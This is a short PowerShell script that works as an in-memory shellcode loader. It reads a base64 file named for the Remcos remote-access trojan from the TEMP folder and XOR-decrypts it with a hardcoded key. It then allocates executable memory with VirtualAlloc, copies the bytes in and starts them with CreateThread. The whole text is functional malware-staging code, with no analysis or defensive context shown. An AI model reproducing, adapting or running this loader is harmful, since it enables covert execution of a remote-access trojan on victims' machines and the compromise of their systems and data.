$k = [System.Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("WmpaS1gxZk03WVIyeE0waw=="))
$s = Get-Content "$env:TEMP\remcos_payload.ps1.b64" -Raw
$b = [Convert]::FromBase64String($s)
for ($i = 0; $i -lt $b.Length; $i++) { $b[$i] = $b[$i] -bxor [byte]$k[$i % $k.Length] }
$w = Add-Type -MemberDefinition '[DllImport("kernel32.dll")] public static extern IntPtr VirtualAlloc(IntPtr, UInt32, UInt32, UInt32); [DllImport("kernel32.dll")] public static extern IntPtr CreateThread(IntPtr, UInt32, IntPtr, IntPtr, UInt32, IntPtr); [DllImport("kernel32.dll")] public static extern IntPtr RtlMoveMemory(IntPtr, byte[], int);' -Name Win32 -Namespace Native -PassThru
$p = $w::VirtualAlloc(0, $b.Length, 0x3000, 0x40)
$w::RtlMoveMemory($p, $b, $b.Length)
$w::CreateThread(0, 0, $p, 0, 0, 0) | Out-Null